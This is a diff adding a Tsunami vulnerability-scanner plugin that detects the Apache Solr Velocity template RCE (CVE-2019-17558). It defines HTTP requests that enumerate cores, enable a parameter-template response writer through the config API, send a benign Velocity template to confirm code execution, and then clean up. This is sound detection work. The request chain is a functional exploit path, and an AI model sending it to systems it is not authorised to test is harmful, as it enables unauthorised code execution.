@@ -1,0 +1,126 @@
+# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "SolrVelocityTemplateRceDetector"
+  author: "Tsunami Team (tsunami-dev@google.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2019_17558"
+  }
+  severity: CRITICAL
+  title: "Apache Solr Velocity Template RCE (CVE-2019-17558)"
+  description: "Apache Solr 5.0.0 to Apache Solr 8.3.1 are vulnerable to a Remote Code Execution through the VelocityResponseWriter. A Velocity template can be provided through Velocity templates in a configset `velocity/` directory or as a parameter. A user defined configset could contain renderable, potentially malicious, templates. Parameter provided templates are disabled by default, but can be enabled by setting `params.resource.loader.enabled` by defining a response writer with that setting set to `true`. Defining a response writer requires configuration API access. Solr 8.4 removed the params resource loader entirely, and only enables the configset-provided template rendering when the configset is `trusted` (has been uploaded by an authenticated user)."
+  recommendation: "Upgrade to Solr 8.4.0 or greater."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2019-17558"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "get_solr_core"
+  http_request: {
+    method: GET
+    uri: "/solr/admin/cores?wt=json&indexInfo=false&_={{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"status\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"status\":\\s*\\{\\s*\"([a-zA-Z0-9._-]+)\""
+            variable_name: "core"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "add_response_writer"
+  http_request: {
+    method: POST
+    uri: "/solr/{{ core }}/config"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"add-queryresponsewriter\":{\"startup\":\"lazy\",\"name\":\"tsunami_{{ T_UTL_CURRENT_TIMESTAMP_MS }}\",\"class\":\"solr.VelocityResponseWriter\",\"template.base.dir\":\"\",\"solr.resource.loader.enabled\":\"true\",\"params.resource.loader.enabled\":\"true\"}}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"responseHeader\":" }
+        ]
+      }
+    }
+  }
+  cleanup_actions: "delete_response_writer"
+}
+
+actions: {
+  name: "trigger_velocity_template"
+  http_request: {
+    method: GET
+    uri: "/solr/{{ core }}/select?q=1&wt=tsunami_{{ T_UTL_CURRENT_TIMESTAMP_MS }}&v.template=custom&v.template.custom=%23set($x=%27TSUNAMI%27)%23set($y=8923*4217)%23set($str=$x.toLowerCase().substring(4)%2b$x.substring(0,4))$str$y$str"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "amiTSUN37628291amiTSUN" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "delete_response_writer"
+  http_request: {
+    client_options: {
+      ignore_http_client_errors: true
+    }
+    method: POST
+    uri: "/solr/{{ core }}/config"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"delete-queryresponsewriter\":\"tsunami_{{ T_UTL_CURRENT_TIMESTAMP_MS }}\"}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "get_solr_core",
+    "add_response_writer",
+    "trigger_velocity_template"
+  ]
+}
